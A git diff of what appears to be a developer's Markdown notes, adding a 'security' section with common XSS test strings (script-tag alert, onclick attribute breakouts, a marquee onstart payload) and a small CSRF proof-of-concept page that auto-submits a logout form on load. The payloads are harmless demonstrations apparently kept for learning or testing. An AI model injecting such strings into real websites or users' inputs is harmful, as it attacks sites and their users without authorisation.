@@ -932,6 +932,27 @@ https://plnkr.co/edit/Cr8UZvI1hxRY60CBDxX3?p=preview&preview
 "volar.inlayHints.eventArgumentInInlineHandlers": true
 ```
 
+### security
+```js
+"><script>alert("XSS")</script>
+"><script>alert("XSS")</script>
+
+" onclick=alert(1)//<button ' onclick=alert(1)//> 
+" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+
+
+"><marquee/onstart=confirm(String.fromCharCode(88,
+"><marquee/onstart=confirm(String.fromCharCode(88,83,83))>//
+
+
+<html>
+  <body onload="document.forms[0].submit()">
+    <form action="https://testsite.com/logout">
+    </form>
+  </body>
+</html>
+```
+
 ### references
 https://junior-datalist.tistory.com/236
 
